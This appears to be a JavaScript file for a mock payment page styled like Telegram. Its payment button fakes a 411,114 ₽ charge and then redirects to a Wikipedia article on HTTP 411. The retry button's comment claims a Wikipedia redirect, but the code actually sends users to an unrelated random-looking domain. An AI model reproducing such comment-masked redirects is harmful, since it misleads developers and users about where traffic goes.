document.addEventListener('DOMContentLoaded', function() {
    const paymentBtn = document.getElementById('payment-btn');
    const retryBtn = document.getElementById('retry-btn');
    
    // Флаг для отслеживания перенаправления
    let isRedirecting = false;
    
    // Обработчик нажатия на кнопку оплаты
    paymentBtn.addEventListener('click', function(e) {
        e.preventDefault(); // Предотвращаем стандартное поведение
        
        if (isRedirecting) return; // Защита от множественных нажатий
        
        isRedirecting = true;
        
        // Показываем состояние загрузки
        const originalHTML = paymentBtn.innerHTML;
        paymentBtn.innerHTML = `
            <div class="tg-btn-content">
                <i class="fas fa-spinner fa-spin"></i>
                <span>ОПЛАТА 411 114 ₽...</span>
            </div>
            <div class="tg-btn-sub">перенаправление на Википедию</div>
        `;
        paymentBtn.disabled = true;
        
        // Перенаправляем на Wikipedia через 1 секунду (для эффекта загрузки)
        setTimeout(() => {
            window.location.href = "https://ru.wikipedia.org/wiki/HTTP_411";
        }, 1000);
    });
    
    // Обработчик кнопки "Попробовать снова" (если она все еще есть на странице)
    if (retryBtn) {
        retryBtn.addEventListener('click', function(e) {
            e.preventDefault(); // Предотвращаем стандартное поведение
            
            if (isRedirecting) return;
            
            isRedirecting = true;
            
            // Показываем загрузку на кнопке повторной попытки
            const originalRetryHTML = retryBtn.innerHTML;
            retryBtn.innerHTML = `
                <i class="fas fa-spinner fa-spin"></i>
                <span>Перенаправление...</span>
            `;
            retryBtn.disabled = true;
            
            // Перенаправляем на Wikipedia через 1 секунду
            setTimeout(() => {
                window.location.href = "https://55311wqetqo.com";
            }, 1000);
        });
    }
});
